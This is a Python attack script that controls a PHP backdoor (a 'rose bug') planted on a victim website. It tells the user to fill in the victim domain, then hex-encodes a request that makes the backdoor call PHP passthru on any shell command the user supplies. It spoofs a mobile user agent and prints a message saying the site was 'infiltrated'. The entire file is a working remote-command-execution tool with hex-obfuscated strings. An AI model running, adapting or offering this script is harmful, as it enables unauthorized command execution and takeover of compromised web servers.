import requests, sys, random, string, urllib.parse
# ADD INTRO
try:
    payload = sys.argv[1]
except IndexError:
    payload = "echo \x44\x75\x6D\x62\x61\x73\x73\x2C\x20\x50\x6C\x65\x61\x73\x65\x20\x70\x61\x73\x73\x20\x61\x6E\x20\x61\x72\x67\x75\x6D\x65\x6E\x74\x20\x73\x75\x63\x68\x20\x61\x73\x20\x5C\x22\x75\x6E\x61\x6D\x65\x20\x2D\x61\x5C\x22\x20\x69\x6E\x63\x6C\x75\x64\x69\x6E\x67\x20\x74\x68\x65\x20\x71\x75\x6F\x74\x65\x73\x20\x74\x6F\x20\x69\x6E\x73\x75\x72\x65\x20\x63\x6F\x72\x72\x65\x63\x74\x20\x66\x6F\x72\x6D\x61\x74\x74\x69\x6E\x67\x2E"
try:
    rose_base = "http://127.0.0.1/"         # REPLACE WITH VICTIM DOMAIN NAME INCLUDING HTTPS OR HTTP DEPENDING ON CERT STATUE
    rose_name = "owo/rose"                  # REPLACE WITH THE FILENAME OF THE ROSE BUG AT THE BASE DIRECTORY EXCLUDING EXTENSION AND THE DOMAIN...ADD DIRECTORIES IF APPLICABLE
    rose_parA = "aaa"                       # DEFAULT IS "aaa" UNLESS YOU ARE HIDING IT IN SOME CODE REPLACE IF APPLICABLE
    rose_parB = "bbb"                       # DEFAULT IS "bbb" UNLESS YOU ARE HIDING IT IN SOME CODE REPLACE IF APPLICABLE
    rose_auth1 = ''.join([random.choice(string.ascii_letters + string.digits) for n in range(32)])
    rose_auth2 = ''.join([random.choice(string.ascii_letters + string.digits) for n in range(32)])
    url = rose_base+rose_name+'\x2E\x70\x68\x70\x3F'+rose_parA+'\x3D\x70\x61\x73\x73\x74\x68\x72\x75\x26'+rose_parB+'\x3D'+payload
    headers = {
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148'
    }
    r = requests.post(urllib.parse.quote(url, safe=":/?&="), headers=headers, auth=(rose_auth1, rose_auth2))
    print("\n"+r.text)
    print("\nRose Infiltrated "+rose_base+" and ran user command \""+payload+"\"")
    print("Authenticated With {"+rose_auth1+"},{"+rose_auth2+"}\n")
except Exception as e:
    print(e)
